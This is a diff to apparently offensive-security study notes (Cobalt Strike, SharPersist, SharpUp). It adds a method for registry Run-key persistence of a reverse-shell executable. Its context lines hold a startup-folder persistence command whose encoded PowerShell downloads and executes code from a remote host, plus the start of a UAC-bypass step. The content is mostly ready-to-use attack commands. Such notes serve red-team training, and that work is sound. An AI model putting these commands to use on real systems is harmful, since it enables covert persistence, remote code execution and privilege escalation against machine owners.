@@ -116,6 +116,11 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 1. `execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -f "UserEnvSetup" -m add`
 2. If above command goes well, it create a file **UserEnvSetup** inside the path **C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**
 
+### Persistence for MS Windows via SharPersist - Mehtod registry autorun
+1. Generate a revershell exe from CS e.g **artifactx64.exe**. 
+2. Place this **artifactx64.exe** in that **C:\tools\malPayloads\artifactx64.exe** in Windows 10 OS. 
+3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`
+
 ### Windows Privilege Escalation - UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
